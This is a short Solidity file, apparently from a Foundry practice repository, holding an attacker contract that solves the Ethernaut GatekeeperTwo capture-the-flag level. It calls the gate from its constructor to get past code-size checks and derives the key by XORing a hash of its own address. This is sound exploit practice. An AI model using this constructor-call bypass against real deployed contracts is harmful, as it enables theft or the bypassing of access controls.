// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {GatekeeperTwo} from "../../src/ethernaut/14_GatekeeperTwo/GatekeeperTwo.sol";

contract GatekeeperTwo_Attacker {
	address player;
	GatekeeperTwo coreInst;
	
	constructor(GatekeeperTwo coreInst_) payable {
		uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
		coreInst_.enter(bytes8(key));
	}
	
	receive() external payable {}
}
